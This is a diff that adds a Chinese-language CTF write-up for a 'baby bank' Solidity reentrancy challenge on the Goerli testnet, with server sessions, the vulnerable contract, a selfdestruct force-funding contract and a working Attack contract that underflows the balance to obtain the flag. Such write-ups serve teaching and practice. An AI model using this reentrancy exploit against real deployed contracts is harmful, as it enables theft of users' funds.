@@ -434,3 +434,178 @@ Get the flag after isSolved event is emitted！
 
 ------
 
+### baby bank
+
+题目描述如下：
+
+> 简单的重入攻击
+>
+> nc 124.221.212.109 10004
+
+`nc`链接靶机，选择`1`选项创建账户，服务器会给我们一个`deployer account`和`token`。
+
+```bash
+┌──(tyd㉿kali-linux)-[~]
+└─$ nc 124.221.212.109 10004
+Easy Re-Entrancy
+Get the flag after isSolved event is emitted！
+
+[1] - Create an account which will be used to deploy the challenge contract
+[2] - Deploy the challenge contract using your generated account
+[3] - Get your flag once you meet the requirement
+[4] - Show the contract source code
+[-] input your choice: 1
+[+] deployer account: 0xef2AF8b5727f5B922931C85300Cc3b8df94E0C70
+[+] token: v4.local.AIgPEKqdLTwKTv7UT3ZOSOLv8Zf82aBA6sTh_CkGZuhslBh1kVc3T-jYCjc_ACIy7Q7FUpNIKvKCXu0bwRyMKebiK2VfjQ8ocRpoOVzrJH65m0yXk4460tzeV2Mtd5JrQBdrd9lZqKPOKdRU6kbr-LPM3aDBPBZtBGOOUxhWEfzfcg
+[+] please transfer 0.012 test ether to the deployer account for next step
+```
+
+用`Metamask`向该地址转账`0.001 GoerliETH`。转账完成后，选择`2`选项，输入`token`部署合约，拿到`contract address`和`transaction hash`。
+
+```bash
+┌──(tyd㉿kali-linux)-[~]
+└─$ nc 124.221.212.109 10004    
+Easy Re-Entrancy
+Get the flag after isSolved event is emitted！
+
+[1] - Create an account which will be used to deploy the challenge contract
+[2] - Deploy the challenge contract using your generated account
+[3] - Get your flag once you meet the requirement
+[4] - Show the contract source code
+[-] input your choice: 2
+[-] input your token: v4.local.AIgPEKqdLTwKTv7UT3ZOSOLv8Zf82aBA6sTh_CkGZuhslBh1kVc3T-jYCjc_ACIy7Q7FUpNIKvKCXu0bwRyMKebiK2VfjQ8ocRpoOVzrJH65m0yXk4460tzeV2Mtd5JrQBdrd9lZqKPOKdRU6kbr-LPM3aDBPBZtBGOOUxhWEfzfcg
+[+] contract address: 0x1B29865d35cE7738E480828924C2ca7209ed393c
+[+] transaction hash: 0xa9cbcfda5c1753c1e41b5cca382cf6c4b56ca226ccdee2a7a2ec276cd027349e
+```
+
+选择`4`选项查看合约代码，审计代码后发现`withdraw`函数先转账交易后修改变量`balance`值，存在`Solidity`重入攻击漏洞。在`Solidity`中，转账给以太坊合约账户时，会执行合约账户相应合约代码的匿名函数（`fallback`）。
+
+> `fallback` 函数
+>
+> 合约最多有一个匿名函数，该函数不能有参数也不能有返回值。虽然`fallback`函数没有参数但是仍然可以用`msg.data`来获取随调用提供的任何有效数据。
+>
+> 函数声明为：`fallback() external [payable]` 或`fallback (bytes calldata _input) external [payable] returns (bytes memory _output)`
+>
+> 如果在一个与合约交互的调用中，没有任何函数与给定的函数标识符匹配（或没有提供调用数据），那么fallback函数就会被执行。
+>
+> 一个没有定义`fallback` 函数的合约直接接收以太币（没有函数调用，即使用 `send` 或 `transfer`）会抛出一个异常， 并返还以太币。所以如果你想让你的合约接收以太币，必须实现标记为`payable`的`fallback`函数。每当合约收到以太币（没有任何数据），`fallback`函数也会执行。如果`fallback`函数没有标记`payable`，则合约不能通过常规交易接收以太币。
+>
+> 如果一个合约没有标记为`payable`的`fallback`函数，则该合约可以作为`coinbase transaction`（又名 `miner block reward`）的接收者，或作为 `selfdestruct` 的目标地址来接收以太币。
+>
+> 注意，`fallback`函数没有 `function` 关键字，可见性必须是`external`。
+
+```solidity
+pragma solidity ^0.4.23;
+
+contract Bank{
+    mapping (address => uint) public balance;
+    event Received(address Sender, uint Value);
+    event isSolved();
+    uint public chance;
+
+    constructor() public {
+        chance = 1;
+    }
+    
+    function() external payable {
+        emit Received(msg.sender, msg.value);
+    }
+
+    function gift() public {
+        require(chance==1);
+        balance[msg.sender] = 2;
+        chance=0;
+    }
+
+    function withdraw(uint amount) public{
+        require(amount==2);
+        require(balance[msg.sender] >= amount);
+        msg.sender.call.value(amount)();
+        balance[msg.sender] -= amount;
+    }
+
+    function payforflag() public {
+        require(balance[msg.sender] >= 10000000000);
+        balance[msg.sender]=0;
+        chance=1;
+        emit isSolved();
+        address _to = 0x498d4BAddD959314591Dc14cb10790e8Df68b1b1;
+        _to.transfer(address(this).balance);
+    }
+
+}
+```
+
+我们故技重施给目标合约地址强制转账用来支付后续攻击操作的`gas`，先部署以下合约代码（在[**Etherscan**](https://goerli.etherscan.io/tx/0x723886556493e1aff41dace5bedebf3281b3bfdc069e5d488202580fd517446d)中可以看到合约创建成功），再向自建合约地址转账（在[**Etherscan**](https://goerli.etherscan.io/tx/0xc03ec1f436a41764db8816a7329d9a5f69b70f302622dfc9df3fe7304a6ed91b)中可以找到本次交易），然后再调用`kill()`函数让自建合约自毁（在[**Etherscan**](https://goerli.etherscan.io/address/0x1b29865d35ce7738e480828924c2ca7209ed393c)中可以看到自建合约已经自毁啦），从而实现向目标合约地址强制转账（在[**Etherscan**](https://goerli.etherscan.io/address/0x1B29865d35cE7738E480828924C2ca7209ed393c)中可以看到目标合约账户已经收到了5 Finney）。
+
+```solidity
+pragma solidity ^0.4.23;
+
+contract Demolition {
+    function () public payable {}
+    function kill() public payable {
+        selfdestruct(address(0x1B29865d35cE7738E480828924C2ca7209ed393c));
+    }
+}
+```
+
+编写攻击合约代码，`attack()`函数会调用`Bank`中的`gift()`初始化`0x1B29865d35cE7738E480828924C2ca7209ed393c`中的`balance = 2`，然后调用`Bank`的`withdraw`函数转账。任何从合约`A`到合约`B`的信息交互（包括以太币的转移）都会将控制权交给合约`B`，这就使得合约`B`能够在交互结束前回调合约`A`的代码。因此在转账过程中会默认调用攻击合约中的匿名函数`fallback`，从而再次进入`withdraw`函数执行。攻击合约代码中利用`bool`型变量`tag`限制了重入`withdraw`函数的次数，只要造成了`balance`的下溢出就停止重入攻击。
+
+```solidity
+pragma solidity ^0.4.23;
+
+import "./Example.sol";
+
+contract Attack {
+    Bank b;
+    bool tag;
+
+    constructor() public {
+        b = Bank(0x1B29865d35cE7738E480828924C2ca7209ed393c);
+        tag = false;
+    }
+
+    function attack() public {
+        b.gift();
+        b.withdraw(2);
+    }
+
+    function getflag() public {
+        b.payforflag();
+    }
+
+    function() public payable {
+        require(tag==false);
+        tag = true;
+        b.withdraw(2);
+    }
+
+}
+```
+
+部署攻击合约后，通过`attack`造成`balance`下溢出为2<sup>256</sup>-2，这样就能满足`payforflag()`函数中的判断条件`balance[msg.sender] >= 10000000000`，点击`getflag`成功在`payforflag()`函数中触发`isSolved()`。
+
+![](https://paper.tanyaodan.com/BUUCTF/BabyBank/1.png)
+
+在[**Etherscan**](https://goerli.etherscan.io/tx/0x43db3805a5829f97c593f91a0ddc7dbda8e4d31f6000c2f4ec59f2b82c373788)中查找本次交易，可以看到本次交易触发了`isSolved`事件，复制`Transaction Hash`，`nc`链接靶机选择`3`选项，输入`token`和`tx hash`即可得到`flag{Y0u_ar3_r0bbing_th3_bank}`。
+
+```bash
+┌──(tyd㉿kali-linux)-[~]
+└─$ nc 124.221.212.109 10004
+Easy Re-Entrancy
+Get the flag after isSolved event is emitted！
+
+[1] - Create an account which will be used to deploy the challenge contract
+[2] - Deploy the challenge contract using your generated account
+[3] - Get your flag once you meet the requirement
+[4] - Show the contract source code
+[-] input your choice: 3
+[-] input your token: v4.local.AIgPEKqdLTwKTv7UT3ZOSOLv8Zf82aBA6sTh_CkGZuhslBh1kVc3T-jYCjc_ACIy7Q7FUpNIKvKCXu0bwRyMKebiK2VfjQ8ocRpoOVzrJH65m0yXk4460tzeV2Mtd5JrQBdrd9lZqKPOKdRU6kbr-LPM3aDBPBZtBGOOUxhWEfzfcg
+[-] input tx hash that emitted isSolved event: 0x43db3805a5829f97c593f91a0ddc7dbda8e4d31f6000c2f4ec59f2b82c373788
+[+] flag: flag{Y0u_ar3_r0bbing_th3_bank}
+```
+
+![](https://paper.tanyaodan.com/BUUCTF/BabyBank/2.png)
+
+------
+
